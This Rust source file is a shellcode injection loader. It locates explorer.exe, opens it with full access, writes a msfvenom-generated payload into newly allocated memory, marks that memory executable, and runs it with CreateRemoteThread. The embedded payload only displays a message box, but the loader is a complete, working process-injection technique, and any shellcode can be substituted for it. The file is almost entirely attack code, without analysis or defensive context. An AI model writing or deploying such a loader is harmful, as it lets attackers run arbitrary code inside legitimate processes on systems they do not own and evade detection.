use std::ffi::c_void;
use libloading::{Library, Symbol};
use std::ptr::{null, null_mut};

const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_EXECUTE: u32 = 0x10;
const PAGE_READWRITE: u32 = 0x04;
const FALSE: i32 = 0;
const PROCESS_ALL_ACCESS: u32 = 0x001F0FFF;

const TARGET_PROCESS: &str = "explorer.exe";

struct WindowsAPI {
    lib: Library,
}

impl WindowsAPI {
    unsafe fn new() -> WindowsAPI {
        WindowsAPI {
            lib: Library::new("kernel32.dll").unwrap(),
        }
    }

    unsafe fn load_func<T>(&self, func_name: &[u8]) -> Symbol<T> {
        self.lib.get(func_name).unwrap()
    }

    unsafe fn open_process(&self, access: u32, inherit_handle: bool, process_id: u32) -> isize {
        let func: Symbol<unsafe extern "system" fn(u32, bool, u32) -> isize> = self.load_func(b"OpenProcess");
        func(access, inherit_handle, process_id)
    }

    unsafe fn virtual_protect_ex(&self, handle: isize, addr: *const c_void, size: usize, protect: u32, old_protect: *mut u32) -> i32 {
        let func: Symbol<unsafe extern "system" fn(isize, *const c_void, usize, u32, *mut u32) -> i32> = self.load_func(b"VirtualProtectEx");
        func(handle, addr, size, protect, old_protect)
    }

    unsafe fn virtual_alloc_ex(&self, handle: isize, addr: *const c_void, size: usize, alloc_type: u32, protect: u32) -> *mut c_void {
        let func: Symbol<unsafe extern "system" fn(isize, *const c_void, usize, u32, u32) -> *mut c_void> = self.load_func(b"VirtualAllocEx");
        func(handle, addr, size, alloc_type, protect)
    }

    unsafe fn write_process_memory(&self, handle: isize, addr: *const c_void, buffer: *const c_void, size: usize, bytes_written: *mut usize) -> i32 {
        let func: Symbol<unsafe extern "system" fn(isize, *const c_void, *const c_void, usize, *mut usize) -> i32> = self.load_func(b"WriteProcessMemory");
        func(handle, addr, buffer, size, bytes_written)
    }

    unsafe fn create_remote_thread(&self, handle: isize, attr: *const c_void, stack_size: usize, start_addr: *const c_void, param: u32, creation_flags: *mut u32, thread_id: *mut u32) -> isize {
        let func: Symbol<unsafe extern "system" fn(isize, *const c_void, usize, *const c_void, u32, *mut u32, *mut u32) -> isize> = self.load_func(b"CreateRemoteThread");
        func(handle, attr, stack_size, start_addr, param, creation_flags, thread_id)
    }

    unsafe fn get_last_error(&self) -> u32 {
        let func: Symbol<unsafe extern "C" fn() -> u32> = self.load_func(b"GetLastError");
        func()
    }
}

fn main() {
    // msfvenom -p windows/x64/messagebox TEXT="hello world" TITLE="Rust Shellcode Runner" EXIT=THREAD -f rust
    const SHELLCODE: [u8; 328] = [
        0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,
        0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
        0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,0x8b,
        0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,
        0x3e,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
        0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
        0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,0x48,0x8b,0x52,0x20,
        0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,0x00,
        0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,
        0x8b,0x48,0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
        0x5c,0x48,0xff,0xc9,0x3e,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
        0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
        0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,0x08,
        0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,
        0x01,0xd0,0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,
        0x1c,0x49,0x01,0xd0,0x3e,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,
        0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,
        0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,
        0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x3e,
        0x48,0x8d,0x8d,0x30,0x01,0x00,0x00,0x41,0xba,0x4c,0x77,0x26,
        0x07,0xff,0xd5,0x49,0xc7,0xc1,0x00,0x00,0x00,0x00,0x3e,0x48,
        0x8d,0x95,0x0e,0x01,0x00,0x00,0x3e,0x4c,0x8d,0x85,0x1a,0x01,
        0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
        0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,
        0x68,0x65,0x6c,0x6c,0x6f,0x20,0x77,0x6f,0x72,0x6c,0x64,0x00,
        0x52,0x75,0x73,0x74,0x20,0x53,0x68,0x65,0x6c,0x6c,0x63,0x6f,
        0x64,0x65,0x20,0x52,0x75,0x6e,0x6e,0x65,0x72,0x00,0x75,0x73,
        0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00
    ];


    const SIZE: usize = SHELLCODE.len();

    let win_api = unsafe { WindowsAPI::new() };


    println!("Searcing for Process to Inject, Using {}", TARGET_PROCESS);
    use sysinfo::{System, SystemExt, ProcessExt, PidExt};
    let s = System::new_all();
    let pid = s.processes_by_exact_name(TARGET_PROCESS).next().expect("Error finding process").pid();
    println!("found {} Process ID: {}", TARGET_PROCESS, pid);

    println!("Opening Process");
    let process_handle = unsafe { win_api.open_process(PROCESS_ALL_ACCESS, false, pid.as_u32()) };
    println!("Obtained Process Handle: {}", process_handle);

    println!("Allocating Memory in target process");
    let addr = unsafe { win_api.virtual_alloc_ex(process_handle, null(), SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) };
    if addr.is_null() {
    println!("Error allocating memory: {}", unsafe { win_api.get_last_error() });
    return;
    } else {
    println!("Allocated Memory at: {:p}", addr);
    }

    println!("Writing Shellcode to target process");
    let mut bytes_written: usize = 0;
    let result = unsafe { win_api.write_process_memory(process_handle, addr, SHELLCODE.as_ptr() as *const c_void, SIZE, &mut bytes_written) };
    if result == FALSE {
        println!("Error writing to process: {}", unsafe { win_api.get_last_error() });
        return;
    } else {
        println!("Wrote {} bytes to process", bytes_written);
    }

    println!("Changing memory protection to PAGE_EXECUTE");
    let mut old_protect: u32 = 0;
    let result = unsafe { win_api.virtual_protect_ex(process_handle, addr, SIZE, PAGE_EXECUTE, &mut old_protect) };
    if result == FALSE {
        println!("Error changing memory protection: {}", unsafe { win_api.get_last_error() });
        return;
    } else {
        println!("Changed memory protection to PAGE_EXECUTE");
    }

    println!("Executing Shellcode in target process {} using address {:p}", TARGET_PROCESS, addr);
    let thread_handle = unsafe { win_api.create_remote_thread(process_handle, null(), 0, addr, 0, null_mut(), null_mut()) };
    if thread_handle == 0 {
        println!("Error creating thread: {}", unsafe { win_api.get_last_error() });
        return;
    } else {
        println!("Created thread with handle: {}", thread_handle);
    }
}
